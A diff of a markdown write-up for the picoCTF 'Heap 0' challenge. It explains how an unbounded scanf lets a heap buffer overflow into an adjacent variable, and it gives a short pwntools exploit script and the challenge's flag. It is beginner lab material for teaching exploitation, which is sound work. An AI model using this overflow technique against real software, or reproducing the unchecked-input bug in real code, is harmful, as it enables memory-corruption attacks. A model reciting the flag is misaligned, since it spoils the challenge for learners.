@@ -1,8 +1,8 @@
-# heap 0
+# Heap 0
 
 **Link**: https://play.picoctf.org/practice/challenge/438
 
-**difficulty**: easy
+**Difficulty**: easy
 
 ## Description
 
@@ -10,45 +10,58 @@ Are overflows just a stack concern?
 
 ## Resources
 
-**chall**: binary file
+- **chall**: the vulnerable binary
+- **chall.c**: its source code
+- **solver.py**: pwntools exploit
+- **flag.txt**: local debugging flag
 
-**chall.c**: source code
+## Key observations (from the source)
+
+- Two heap blocks are allocated one after another:
+
+      input_data = malloc(INPUT_DATA_SIZE);   // "pico"  (your buffer)
+      safe_var   = malloc(SAFE_VAR_SIZE);     // "bico"  (the target)
+
+- The win condition only checks that `safe_var` is no longer `"bico"`:
+
+      if (strcmp(safe_var, "bico") != 0) { /* print flag */ }
+
+- Option **2 ("Write to buffer")** does `scanf("%s", input_data)` with **no length
+  check** — an unbounded write into a small heap chunk. Since `safe_var` sits
+  right after `input_data` on the heap, we can overflow forward into it.
+
+The menu:
+
+    1. Print Heap        (leaks addresses of both chunks)
+    2. Write to buffer   (unbounded scanf -> heap overflow)
+    3. Print safe_var
+    4. Print Flag        (checks safe_var != "bico")
+    5. Exit
 
 ## How to solve
 
-By running the binary you receive 2 leaks:
+1. Parse the two leaked addresses from the "Print Heap" output.
+2. The distance to overwrite is `safe_var - input_data`. Write that many `A`s to
+   fill up to `safe_var`, then one more byte so `safe_var` differs from `"bico"`.
+3. Choose option 4 to print the flag.
 
-    Heap State:
-    +-------------+----------------+
-    [*] Address   ->   Heap Data
-    +-------------+----------------+
-    [*]   0x64dcc00c26b0  ->   pico
-    +-------------+----------------+
-    [*]   0x64dcc00c26d0  ->   bico
-    +-------------+----------------+
+Exploit (see `solver.py`, run with `python3 solver.py REMOTE`):
 
-By looking at the code it is easy to see that the goal is to change the value inside the second address in order to be a value different from bico. Also there is a menu that helps for navigating through this process
-
-    1. Print Heap:          (print the current state of the heap)
-    2. Write to buffer:     (write to your own personal block of data on the heap)
-    3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
-    4. Print Flag:          (Try to print the flag, good luck)
-    5. Exit
-
-Example snippet (inside your exploit script):
-
-    infomations = io.recvuntil(b'Enter your choice: ')
-    address1 = int(infomations[341:355], 16)
-    address2 = int(infomations[406:420], 16)
+    informations = io.recvuntil(b'Enter your choice: ')
+    address1 = int(informations[341:355], 16)   # input_data
+    address2 = int(informations[406:420], 16)   # safe_var
     diff = address2 - address1
-    io.sendline(b'2') 
+    io.sendline(b'2')
     io.recvuntil(b'Data for buffer: ')
-    io.sendline(b'A'*diff+b'b') 
+    io.sendline(b'A' * diff + b'b')              # fill gap + clobber safe_var
     io.recvuntil(b'Enter your choice: ')
-    io.sendline(b'4') 
+    io.sendline(b'4')
     print(io.recvall(1))
 
-At the end you should get the flag:
+> Note: the byte offsets `[341:355]` / `[406:420]` are slices into the exact banner
+> text — if the menu wording changes, re-derive them (or parse with a regex on
+> `0x[0-9a-f]+`).
+
+## Flag
 
     picoCTF{my_first_heap_overflow_4fa6dd49}
-
